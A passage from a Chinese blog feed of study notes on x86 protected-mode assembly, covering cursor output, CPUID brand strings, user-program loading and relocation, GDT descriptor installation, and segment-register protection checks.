ebx         jmp .getc  .exit:         pop ecx         retf                               ;段间返回;-------------------------------------------------------------------------------put_char:                                   ;在当前光标处显示一个字符,并推进                                            ;光标。仅用于段内调用                                             ;输入：CL=字符ASCII码          pushad         ;以下取当前光标位置         mov dx,0x3d4         mov al,0x0e         out dx,al         inc dx                             ;0x3d5         in al,dx                           ;高字         mov ah,al         dec dx                             ;0x3d4         mov al,0x0f         out dx,al         inc dx                             ;0x3d5         in al,dx                           ;低字         mov bx,ax                          ;BX=代表光标位置的16位数         cmp cl,0x0d                        ;回车符？         jnz .put_0a         mov ax,bx         mov bl,80         div bl         mul bl         mov bx,ax         jmp .set_cursor  .put_0a:         cmp cl,0x0a                        ;换行符？         jnz .put_other         add bx,80         jmp .roll_screen  .put_other:                               ;正常显示字符         push es         mov eax,video_ram_seg_sel          ;0xb8000段的选择子         mov es,eax         shl bx,1         mov [es:bx],cl         pop es         ;以下将光标位置推进一个字符         shr bx,1         inc bx  .roll_screen:         cmp bx,2000                        ;光标超出屏幕？滚屏         jl .set_cursor         push ds         push es         mov eax,video_ram_seg_sel         mov ds,eax         mov es,eax         cld         mov esi,0xa0                       ;小心！32位模式下movsb/w/d          mov edi,0x00                       ;使用的是esi/edi/ecx          mov ecx,1920         rep movsd         mov bx,3840                        ;清除屏幕最底一行         mov ecx,80                         ;32位程序应该使用ECX  .cls:         mov word[es:bx],0x0720         add bx,2         loop .cls         pop es         pop ds         mov bx,1920  .set_cursor:         mov dx,0x3d4         mov al,0x0e         out dx,al         inc dx                             ;0x3d5         mov al,bh         out dx,al         dec dx                             ;0x3d4         mov al,0x0f         out dx,al         inc dx                             ;0x3d5         mov al,bl         out dx,al         popad         ret   </code></pre><pre><code>start:         mov ecx,core_data_seg_sel           ;使ds指向核心数据段          mov ds,ecx         mov ebx,message_1         call sys_routine_seg_sel:put_string </code></pre><p>进入<mark>start</mark>标号之后，先将内核自己的数据段选择子<mark>core_data_seg_sel</mark>传送给<mark>DS</mark>，之后将文本信息的标号<mark>message_1</mark>传送给<mark>ebx</mark>，之后使用<mark>call</mark>指令进行过程调用，处理器将段寄存器<mark>CS</mark>和指令指针寄存器<mark>EIP(下一条指令的有效地址)</mark>进行压栈保存，使用指令中的系统公共例程代码段的选择子<mark>sys_routine_seg_sel</mark>取得描述符，经过检查之后加载到<mark>CS描述符高速缓存器</mark>，同时使用指令中的偏移量<mark>put_string</mark>改变指令指针寄存器<mark>EIP</mark>，这样就转到目标过程内部执行。</p><p>其中<mark>movsd</mark>指令的操作和当前默认操作尺寸相关：<br>    1. 当前操作尺寸是16位，源操作数由<mark>DS:SI</mark>指定、目的操作数由<mark>ES:DI</mark>指定；<br>    2. 当前操作尺寸是32位，源操作数由<mark>DS:ESI</mark>指定、目的操作数由<mark>ES:EDI</mark>指定；<br>    且由于当前是在32位操作尺寸下，所以重复传送的次数由<mark>ECX</mark>指定。</p><h2 id="07-用CPUID指令显示处理器品牌信息并显示"><a href="#07-用CPUID指令显示处理器品牌信息并显示" class="headerlink" title="07. 用CPUID指令显示处理器品牌信息并显示"></a>07. 用CPUID指令显示处理器品牌信息并显示</h2><p><mark>cpuid(CPU identification)</mark>指令用于返回处理器的标识和特性信息，需要使用<mark>EAX</mark>指定要返回什么样的信息，指定功能号。</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/cced9754233b346a0965ffc53d66187c.png" class=""><p><mark>cpuid</mark>指令是在<mark>80486</mark>后期版本引入，在执行<mark>cpuid</mark>指令之前要检测处理器是否支持该指令：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/5e72268ea5185704e17458c5ff490729.png" class=""><p><mark>EFLAGS</mark>的位21是ID位，为0表示不支持cpuid指令，为1表示支持cpuid指令<br>本节代码：</p><pre><code class="assembly">         cpu_brnd0        db 0x0d,0x0a,'  ',0         cpu_brand  times 52 db 0         cpu_brnd1        db 0x0d,0x0a,0x0d,0x0a,0</code></pre><pre><code class="assembly">                        ;显示处理器品牌信息          mov eax,0x80000002         cpuid         mov [cpu_brand + 0x00],eax         mov [cpu_brand + 0x04],ebx         mov [cpu_brand + 0x08],ecx         mov [cpu_brand + 0x0c],edx               mov eax,0x80000003         cpuid         mov [cpu_brand + 0x10],eax         mov [cpu_brand + 0x14],ebx         mov [cpu_brand + 0x18],ecx         mov [cpu_brand + 0x1c],edx         mov eax,0x80000004         cpuid         mov [cpu_brand + 0x20],eax         mov [cpu_brand + 0x24],ebx         mov [cpu_brand + 0x28],ecx         mov [cpu_brand + 0x2c],edx         mov ebx,cpu_brnd0         call sys_routine_seg_sel:put_string         mov ebx,cpu_brand         call sys_routine_seg_sel:put_string         mov ebx,cpu_brnd1         call sys_routine_seg_sel:put_string </code></pre><h2 id="08-准备加载用户程序"><a href="#08-准备加载用户程序" class="headerlink" title="08. 准备加载用户程序"></a>08. 准备加载用户程序</h2><p>接上一节，加载用户程序：</p><pre><code class="assembly">         mov ebx,message_5         call sys_routine_seg_sel:put_string         mov esi,50                          ;用户程序位于逻辑50扇区          call load_relocate_program</code></pre><pre><code class="assembly">SECTION header vstart=0         program_length   dd program_end          ;程序总长度#0x00                  head_len         dd header_end           ;程序头部的长度#0x04         stack_seg        dd 0                    ;用于接收堆栈段选择子#0x08         stack_len        dd 1                    ;程序建议的堆栈大小#0x0c                                                  ;以4KB为单位                                                           prgentry         dd start                ;程序入口#0x10          code_seg         dd section.code.start   ;代码段位置#0x14         code_len         dd code_end             ;代码段长度#0x18         data_seg         dd section.data.start   ;数据段位置#0x1c         data_len         dd data_end             ;数据段长度#0x20 </code></pre><p>主要讲了用户程序的构造，由哪些部分组成起始和结束地址在哪，具体代码看c13.asm</p><h2 id="09-预读用户程序并得到它的大小"><a href="#09-预读用户程序并得到它的大小" class="headerlink" title="09. 预读用户程序并得到它的大小"></a>09. 预读用户程序并得到它的大小</h2><p>内容：读取用户程序的第一个扇区，取得用户程序的长度</p><pre><code class="assembly">SECTION core_code vstart=0;-------------------------------------------------------------------------------load_relocate_program:                      ;加载并重定位用户程序                                            ;输入：ESI=起始逻辑扇区号                                            ;返回：AX=指向用户程序头部的选择子          push ebx         push ecx         push edx         push esi         push edi               push ds         push es               mov eax,core_data_seg_sel         mov ds,eax                         ;切换DS到内核数据段                mov eax,esi                        ;读取程序头部数据          mov ebx,core_buf                                 call sys_routine_seg_sel:read_hard_disk_0 </code></pre><h2 id="10-条件传送簇CMOVcc"><a href="#10-条件传送簇CMOVcc" class="headerlink" title="10. 条件传送簇CMOVcc"></a>10. 条件传送簇CMOVcc</h2><p><mark>mov</mark>指令传统方式：会影响流水线效率，因为条件转移指令发生就会使流水线编译的译码失效需要重新编译，虽然现代处理器有了分支预测技术但是分支预测并不总是对的。</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0d699825616fb370b99fdac1f9689859.png" class=""><p>使用<mark>CMOVcc</mark>指令简化传送指令：<mark>ne</mark>表示<mark>Not Equal</mark></p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/a37067392ac8d6dba19b384c333b109c.png" class=""><p>Intel手册中有<mark>CMOV</mark>指令文档</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0b088096f037a5b3383b83b003e3ca11.png" class=""><p><mark>CMOV</mark>指令格式</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0671b8c5bff812d609716ade0c2bd572.png" class=""><p>条件传送指令是从<mark>P6处理器</mark>开始引入的，使用<mark>1</mark>功能号通过查看<mark>EDX</mark>的返回值可以查看处理器是否支持这个指令簇</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/826acaeec0d57740394d8a9bb0052db9.png" class=""><h2 id="11-计算以512字节为单位的用户程序总长度"><a href="#11-计算以512字节为单位的用户程序总长度" class="headerlink" title="11. 计算以512字节为单位的用户程序总长度"></a>11. 计算以512字节为单位的用户程序总长度</h2><p>在二进制中，512整数倍的数，低9位均为0。</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/4dfe3bf8b2ce32811fa15da1fe42f3a5.png" class=""><p>判断用户程序的大小是否为<mark>512</mark>的整倍数</p><pre><code class="assembly">         ;以下判断整个程序有多大         mov eax,[core_buf]                 ;程序尺寸         mov ebx,eax         and ebx,0xfffffe00                 ;使之512字节对齐（能被512整除的数，          add ebx,512                        ;低9位都为0          test eax,0x000001ff                ;程序的大小正好是512的倍数吗?          cmovnz eax,ebx                     ;不是。使用凑整的结果 </code></pre><h2 id="12-内存分配的基本策略和方法"><a href="#12-内存分配的基本策略和方法" class="headerlink" title="12. 内存分配的基本策略和方法"></a>12. 内存分配的基本策略和方法</h2><p> 操作系统必须记录所有可以分配的物理内存，当一个程序要求分配内存时，内存管理程序从可分配的内存中切割出一段将其标记为已使用。已分配内存在使用之后还需要负责回收它们，将其标记为空闲以便再次分配。</p><p> 当内存空间紧张时，内存管理程序还需要查找那些很久未使用的程序，将其移出到硬盘上，腾出空间给需要使用内存的程序使用。下次用到这些内存时再将其加载到内存中。这就是<mark>虚拟内存管理</mark>。</p><p> 现在的内存布局：<br> <img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/4e008d4175628203a066130d057cce66.png" class=""></p><p> 若一次分配<mark>512</mark>字节内存，从<mark>0x00100000</mark>处开始分配，则下一次从<mark>0x00100200</mark>处开始继续分配。<br> <img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/04ac4b9bbf72aa3bf7d650f4b83b071f.png" class=""></p><h2 id="13-内存分配的简易实现过程"><a href="#13-内存分配的简易实现过程" class="headerlink" title="13. 内存分配的简易实现过程"></a>13. 内存分配的简易实现过程</h2><p> 本节代码：</p><pre><code class="assembly">allocate_memory:                            ;分配内存                                           ;输入：ECX=希望分配的字节数                                           ;输出：ECX=起始线性地址         push ds        push eax        push ebx             mov eax,core_data_seg_sel        mov ds,eax             mov eax,[ram_alloc]        add eax,ecx                        ;下一次分配时的起始地址             ;这里应当有检测可用内存数量的指令                 mov ecx,[ram_alloc]                ;返回分配的起始地址        mov ebx,eax        and ebx,0xfffffffc        add ebx,4                          ;强制对齐         test eax,0x00000003                ;下次分配的起始地址最好是4字节对齐        cmovnz eax,ebx                     ;如果没有对齐，则强制对齐         mov [ram_alloc],eax                ;下次从该地址分配内存                                           ;cmovcc指令可以避免控制转移         pop ebx        pop eax        pop ds        retf             </code></pre><h2 id="14-加载用户程序"><a href="#14-加载用户程序" class="headerlink" title="14. 加载用户程序"></a>14. 加载用户程序</h2><p> 本节代码：</p><pre><code class="assembly">         mov ecx,eax                        ;实际需要申请的内存数量        call sys_routine_seg_sel:allocate_memory        mov ebx,ecx                        ;ebx -&gt; 申请到的内存首地址        push ebx                           ;保存该首地址         xor edx,edx        mov ecx,512        div ecx        mov ecx,eax                        ;总扇区数              mov eax,mem_0_4_gb_seg_sel         ;切换DS到0-4GB的段        mov ds,eax        mov eax,esi                        ;起始扇区号  .b1:        call sys_routine_seg_sel:read_hard_disk_0        inc eax        loop .b1</code></pre><h2 id="15-准备安装用户程序的段描述符"><a href="#15-准备安装用户程序的段描述符" class="headerlink" title="15. 准备安装用户程序的段描述符"></a>15. 准备安装用户程序的段描述符</h2><p> 本节代码：</p><pre><code class="assembly">        ;建立程序头部段描述符       pop edi                            ;恢复程序装载的首地址        mov eax,edi                        ;程序头部起始线性地址       mov ebx,[edi+0x04]                 ;段长度       dec ebx                            ;段界限        mov ecx,0x00409200                 ;字节粒度的数据段描述符       call sys_routine_seg_sel:make_seg_descriptor       call sys_routine_seg_sel:set_up_gdt_descriptor       mov [edi+0x04],cx </code></pre><p>使用<mark>make-seg_descriptor</mark>创建描述符、使用<mark>set_up_gdt_descriptor</mark>安装描述符。</p><p>其中头部段描述符：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/144616b2a2b154bd174b8d71383ff689.png" class=""><ul><li>G位：0表示段界限以字节为单位</li><li>P位：1表示段存在</li><li>S位：1表示这是一个存储器的段描述符</li><li>X位：0表示这是一个数据段</li><li>E位：0表示段向上扩展</li><li>W位：0表示可读可写</li></ul><h2 id="16-用SGDT和MOVZX指令确定GDT的位置"><a href="#16-用SGDT和MOVZX指令确定GDT的位置" class="headerlink" title="16. 用SGDT和MOVZX指令确定GDT的位置"></a>16. 用SGDT和MOVZX指令确定GDT的位置</h2><p><mark>sgdt m</mark>指令：将<mark>GDTR</mark>的内容保存到内存地址<mark>m</mark>处</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/8ee964a20a641a57cd2df08e5c65c163.png" class=""><p><mark>movzx</mark>指令：0扩展传送指令</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/a7b3bddccde1412511d349b08ec6851b.png" class=""><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/894b778c290e658fb31380b2feab024e.png" class=""><p><mark>movsx</mark>：符号位扩展传送指令</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/87fd4f6a3c17dfc49006dfa49461fa5e.png" class=""><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0c0ba9317c35169c418216cb17d82d0c.png" class=""><p>本节代码：<mark>GDTR</mark>是一个<mark>48</mark>位的寄存器高<mark>32</mark>位存储的内容是<mark>GDT起始线性地址</mark>低<mark>16</mark>位存储的内容是<mark>GDT的界限值</mark>，通过sgdt指令获取到GDTR的值之后提取低16位的界限值将<mark>界限值加1</mark>再加上<mark>GDT的起始线性地址</mark>即可得到下一个描述符的线性地址，后面就可以使用这个线性地址来安装新的描述符。</p><pre><code class="assembly">set_up_gdt_descriptor:                      ;在GDT内安装一个新的描述符                                            ;输入：EDX:EAX=描述符                                             ;输出：CX=描述符的选择子         push eax         push ebx         push edx               push ds         push es               mov ebx,core_data_seg_sel          ;切换到核心数据段         mov ds,ebx         sgdt [pgdt]                        ;以便开始处理GDT         mov ebx,mem_0_4_gb_seg_sel         mov es,ebx         movzx ebx,word [pgdt]              ;GDT界限          inc bx                             ;GDT总字节数，也是下一个描述符偏移          add ebx,[pgdt+2]                   ;下一个描述符的线性地址       </code></pre><h2 id="17-安装新描述符并生成选择子"><a href="#17-安装新描述符并生成选择子" class="headerlink" title="17. 安装新描述符并生成选择子"></a>17. 安装新描述符并生成选择子</h2><p>接上一节代码：</p><pre><code class="assembly">         mov [es:ebx],eax         mov [es:ebx+4],edx               add word [pgdt],8                  ;增加一个描述符的大小                  lgdt [pgdt]                        ;对GDT的更改生效                 mov ax,[pgdt]                      ;得到GDT界限值         xor dx,dx         mov bx,8         div bx                             ;除以8，去掉余数         mov cx,ax                                   shl cx,3                           ;将索引号移到正确位置          pop es         pop ds         pop edx         pop ebx         pop eax               retf </code></pre><p>安装了新的描述符之后使用<mark>lgdt[pgdt]</mark>指令使得新的描述符生效，然后将GDT的界限值除以8得到描述符的索引号，再将索引号左移三位右边补零生成新的选择子。</p><h2 id="18-安装用户程序的段描述符并回填选择子"><a href="#18-安装用户程序的段描述符并回填选择子" class="headerlink" title="18. 安装用户程序的段描述符并回填选择子"></a>18. 安装用户程序的段描述符并回填选择子</h2><p>代码如下：</p><pre><code class="assembly">;建立程序头部段描述符         pop edi                            ;恢复程序装载的首地址          mov eax,edi                        ;程序头部起始线性地址         mov ebx,[edi+0x04]                 ;段长度         dec ebx                            ;段界限          mov ecx,0x00409200                 ;字节粒度的数据段描述符         call sys_routine_seg_sel:make_seg_descriptor         call sys_routine_seg_sel:set_up_gdt_descriptor         mov [edi+0x04],cx               </code></pre><p>回填选择子：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/99972661419e171cf0c3cdaaafd94d1f.png" class=""><p>之后用户程序头部的<mark>0x04</mark>处就是<mark>选择子</mark>了，而且只用到了低32位，高32位还是原来的值</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/6d34a115a6fee41642876058aa070a2c.png" class=""><p>接着创建代码段描述符：</p><pre><code class="assembly">         ;建立程序代码段描述符         mov eax,edi         add eax,[edi+0x0c]                 ;代码起始线性地址         mov ebx,[edi+0x10]                 ;段长度         dec ebx                            ;段界限         mov ecx,0x00409800                 ;字节粒度的代码段描述符         call sys_routine_seg_sel:make_seg_descriptor         call sys_routine_seg_sel:set_up_gdt_descriptor         mov [edi+0x14],cx   </code></pre><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/e38333b91447d2184bcae4ae6b518ed4.png" class=""><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/90d787418a73c3b0e54694974514c50a.png" class=""><p>之后就进行安装和加载描述符，后面还有数据段和栈段描述符：流程基本都是一样的</p><pre><code class="assembly"> ;建立程序数据段描述符         mov eax,edi         add eax,[edi+0x14]                 ;数据段起始线性地址         mov ebx,[edi+0x18]                 ;段长度         dec ebx                            ;段界限         mov ecx,0x00409200                 ;字节粒度的数据段描述符         call sys_routine_seg_sel:make_seg_descriptor         call sys_routine_seg_sel:set_up_gdt_descriptor         mov [edi+0x14],cx ;建立程序堆栈段描述符              mov eax,edi        add eax,[edi+0x1c];栈段起始线性地址        mov ebx,[edi+0x20];段长度        dec ebx;段界限        mov ecx,0x00409200；字节粒度的数据段描述符        call sys_routine_seg_sel:make_seg_descriptor        call sys_routine_seg_sel:set_up_gdt_descriptor        mov [edi+0x1c],cx</code></pre><h2 id="19-用户程序的执行和退出"><a href="#19-用户程序的执行和退出" class="headerlink" title="19. 用户程序的执行和退出"></a>19. 用户程序的执行和退出</h2><p>从<mark>load_relocate_program</mark>程序返回之前将用户程序头部段的选择子保存在<mark>AX</mark>中。</p><pre><code class="assembly">SECTION core_code vstart=0;-------------------------------------------------------------------------------load_relocate_program:                      ;加载并重定位用户程序                                            ;输入：ESI=起始逻辑扇区号                                            ;返回：AX=指向用户程序头部的选择子          push ebx         push ecx         push edx         push esi         push edi               push ds         push es               mov eax,core_data_seg_sel         mov ds,eax                         ;切换DS到内核数据段                mov eax,esi                        ;读取程序头部数据          mov ebx,core_buf                                 call sys_routine_seg_sel:read_hard_disk_0                         ...         ...         ...                  mov ax,[es:0x04]         pop es                             ;恢复到调用此过程前的es段          pop ds                             ;恢复到调用此过程前的ds段               pop edi         pop esi         pop edx         pop ecx         pop ebx               ret        </code></pre><p>从<mark>load_relocate_program</mark>程序返回内核程序：</p><pre><code class="assembly">          call load_relocate_program         mov ebx,do_status         call sys_routine_seg_sel:put_string               mov [esp_pointer],esp               ;临时保存堆栈指针                mov ds,ax ;从load_relocate_program程序返回时，用户程序头部段选择子存在AX中         call far [0x08]                     ;控制权交给用户程序（入口点）                                             ;堆栈可能切换 </code></pre><p>这条<mark>call far [0x08]</mark> 指令执行时，处理器用段寄存器<mark>DS</mark>访问用户程序头部段，从偏移为8的地方取出32位偏移量传送到指令指针<mark>EIP</mark>，再取出16位段选择子传送到段寄存器<mark>DS</mark>，然后处理器进入用户程序内部执行。<br>用户程序<mark>start</mark>代码：</p><pre><code class="assembly">SECTION code vstart=0start:         mov eax,ds;此时DS指向用户程序头部段         mov fs,eax;但是我们不能失去对DS的追踪，所以使用其他FS段寄存器重新设置DS         ;mov eax,[stack_seg]         ;mov ss,eax         ;mov esp,stack_end         ;mov eax,[data_seg]         ;mov ds,eax         ;用户程序要做的事情（省略）         retf                                     ;将控制权返回到系统code_end:</code></pre><p>从用户程序返回到内核代码段：</p><pre><code class="assembly">    call far [0x08]                     ;控制权交给用户程序（入口点）                                        ;堆栈可能切换     return_point:                           ;用户程序返回点    mov eax,core_data_seg_sel           ;使ds指向核心数据段    mov ds,eax        mov eax,core_stack_seg_sel          ;切换回内核自己的堆栈    mov ss,eax     mov esp,[esp_pointer]        mov ebx,message_6    call sys_routine_seg_sel:put_string        ;这里可以放置清除用户程序各种描述符的指令    ;也可以加载并启动其它程序        hlt;在主引导程序进入保护模式之前使用cli指令清除了中断，        ;所以在这里用hlt指令让处理器停机之后不会被中断唤醒</code></pre><h2 id="20-在虚拟机上观察内核的加载以及用户程序的执行与推出"><a href="#20-在虚拟机上观察内核的加载以及用户程序的执行与推出" class="headerlink" title="20. 在虚拟机上观察内核的加载以及用户程序的执行与推出"></a>20. 在虚拟机上观察内核的加载以及用户程序的执行与推出</h2><p>起始LBA扇区号：</p><ul><li>主引导程序：0</li><li>内核程序：1</li><li>用户程序：50</li></ul><p>VirtualBox虚拟机执行成功：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/196c7eb008b6f6764d38d54857bbfa46.png" class=""><p>Bochs虚拟机执行成功：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0df1110c1d014a7245f3fcb33df9f078.png" class=""><p>可以自行调试观察<mark>EFLAGS、GDT、内核程序头部和用户程序头部</mark>内容以及栈的变化。</p>]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>24-存储器的保护</title>
      <link href="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/"/>
      <url>/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="01-MOV-DS-AX和-MOV-DS-EAX"><a href="#01-MOV-DS-AX和-MOV-DS-EAX" class="headerlink" title="01. MOV DS, AX和 MOV DS, EAX"></a>01. MOV DS, AX和 MOV DS, EAX</h2><p>这两条指令计算GDT的逻辑段地址,使用64位除法指令: eax(商)保存段地址, edx(余数)保存偏移<br><code>div r/m32</code></p><span id="more"></span><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1b5047235903fba8bbb50f7d347f9a3a.png" class=""><p><code>mov ds, ax</code>在16位操作尺寸下机器码是<mark>8ED8</mark>, 在32位操作尺寸下应该是<mark>668ED8</mark>, 但是Intel的官方文档对这种指令做了优化: </p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/b8566b6fdd714d9f20e7ccc8d0d9d4fe.png" class=""><p>但是有些编译器在编译这条指令的时候仍然会加上<mark>66前缀<mark>所以官方文档建议使用<code>mov ds, eax</code>, 不过在NASM编译器下编译的结果不管是<code>mov ds, eax</code>还是<code>mov ds, ax</code>在16还是32操作尺寸下都不会有<mark>前缀66</mark>.<br>编译之后查看<mark>lst</mark>列表文件:<br>使用16位操作尺寸时:</mark></mark></p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/012766565620de75ea1fd36a90d8a8e7.png" class="" title="16位操作尺寸"><p>使用32位操作尺寸时:</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/a756dd044cdd21358ddb4cd809abbf26.png" class="" title="32位操作尺寸"><p>可以看到NASM编译器将指令译码成了<mark>8ED8</mark>.<br>处理器不允许在任何时候使用索引字段为<mark>0</mark>的选择子去访问<mark>0号</mark>描述符, 任何时候的访问都会引发异常中断</p><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/dff722b81cbcf64715b115b92270809e.png" class="" title="0描述符"><ul><li>此节程序设置了<mark>GDT</mark>逻辑地址, 安装了描述符, 加载初始化了<mark>GDTR</mark>, 打开<mark>A20</mark>地址线, 清除中断, 设置CR0寄存器的<strong>PE</strong>位进入保护模式, <strong>jmpf</strong>进入保护模式执行.</li></ul><h2 id="02-修改段寄存器的保护"><a href="#02-修改段寄存器的保护" class="headerlink" title="02. 修改段寄存器的保护"></a>02. 修改段寄存器的保护</h2><h3 id="本节主要内容-介绍保护模式下修改段寄存器时的保护机制"><a href="#本节主要内容-介绍保护模式下修改段寄存器时的保护机制" class="headerlink" title="本节主要内容:介绍保护模式下修改段寄存器时的保护机制"></a>本节主要内容:介绍保护模式下修改段寄存器时的保护机制</h3><p>保护模式下对段寄存器的修改要分为两步:<br>    1. 将一个描述符选择子带入段选择器此时要检查带入值的合法性<br>    2. 用选择子选择一个描述符并传送到段描述符高速缓存器, 此时要检查描述符的完整性和正确性</p><p>在上一节进入到保护模式之后, 执行了<mark>jmpf</mark>, 此时给出的段选择子的<mark>TI位</mark>都是0, 表示要选择的描述符都在<mark>GDT</mark>中. 同时也要执行两步检查来确认这一过程的正确</p><ol><li><p>将一个描述符选择子带入段选择器此时要检查带入值的合法性</p><ol><li>处理器会检查访问的描述符的边界, 如果超过了边界条件就会产生一个<mark>异常中断13</mark>, 同时寄存器保持原来的值不变. <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/cf7be462210f27a56e9cce8c87d9f08c.png" class=""></li></ol></li><li><p>用选择子选择一个描述符并传送到段描述符高速缓存器, 此时要检查描述符的完整性和正确性</p><ol><li>确定描述符的类型, 比如描述符<mark>S=1, X=1</mark>, 表示此描述符代表一个代码段, 只能加载到段寄存器CS. 首先表示描述符类型<mark>TYPE</mark>的四个字段必须是有效的(X E 